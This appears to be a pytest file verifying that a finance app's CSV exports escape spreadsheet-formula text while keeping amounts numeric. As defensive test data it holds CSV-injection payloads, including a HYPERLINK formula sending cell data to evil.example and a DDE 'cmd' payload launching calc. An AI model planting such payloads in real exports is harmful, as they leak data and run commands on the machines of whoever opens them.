"""CSV exports: a text cell that a spreadsheet would run as a formula is escaped,
an amount stays a number."""

from datetime import date
from decimal import Decimal

import pytest

from backend import crud, csv_safety
from backend.database import SessionLocal
from backend.models import Account, Category, Transaction

FORMULA = '=HYPERLINK("http://evil.example/?d="&A1,"Click")'


@pytest.mark.parametrize("cell", ["=1+1", "+33 SUM(A1)", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd", FORMULA])
def test_a_text_cell_that_starts_like_a_formula_is_escaped(cell):
    assert csv_safety.escape_cell(cell) == "'" + cell


@pytest.mark.parametrize("cell", ["-12.50", "+12.50", "-1 234,56 €", "-1 234,56 €", "-5 %", "Groceries", "", 12, None])
def test_amounts_and_ordinary_cells_are_kept(cell):
    assert csv_safety.escape_cell(cell) == cell


@pytest.fixture
def poisoned(security_data):
    """An operation whose free texts are formulas, for an amount of -12.50."""
    with SessionLocal() as db:
        account = crud.create_account(db, "@SUM(1+1)", "courant", Decimal("0"))
        category = crud.create_category(db, "=cmd|' /C calc'!A0", None)
        transaction = Transaction(
            date=date.today(),
            label=FORMULA,
            raw_label="-RAW+LABEL",
            amount=Decimal("-12.50"),
            account_id=account.id,
            category_id=category.id,
            validated=True,
        )
        db.add(transaction)
        db.commit()
        ids = (transaction.id, category.id, account.id)
    yield
    with SessionLocal() as db:
        db.query(Transaction).filter(Transaction.id == ids[0]).delete()
        db.query(Category).filter(Category.id == ids[1]).delete()
        db.query(Account).filter(Account.id == ids[2]).delete()
        db.commit()


def _rows(response) -> list[list[str]]:
    assert response.status_code == 200
    return [line.split(";") for line in response.text.lstrip("﻿").splitlines()]


def _row_with(rows, needle):
    return next(row for row in rows if any(needle in cell for cell in row))


def test_the_transactions_export_escapes_free_texts_but_keeps_the_amount(signed_in, poisoned):
    rows = _rows(signed_in["viewer"].get("/export/transactions.csv"))
    row = _row_with(rows, "HYPERLINK")

    assert row[1].startswith('"\'=HYPERLINK')
    assert row[2] == "'-RAW+LABEL"
    assert row[3] == "-12.50"
    assert row[4] == "'=cmd|' /C calc'!A0"
    assert row[6] == "'@SUM(1+1)"


def test_the_report_exports_escape_free_texts_but_keep_the_amounts(signed_in, poisoned):
    today = date.today()
    period = f"period_type=mois&month={today.month}&year={today.year}"

    operations = _rows(signed_in["viewer"].get(f"/reports/transactions/export.csv?{period}&type=expense"))
    row = _row_with(operations, "HYPERLINK")
    assert row[1].startswith('"\'=HYPERLINK')
    assert row[2] == "'=cmd|' /C calc'!A0"
    assert row[3] == "'@SUM(1+1)"
    assert row[4] == "-12.50"

    summary = _rows(signed_in["viewer"].get(f"/reports/export.csv?{period}"))
    category_row = _row_with(summary, "cmd|")
    assert category_row[0] == "'=cmd|' /C calc'!A0"
    assert not category_row[1].startswith("'")
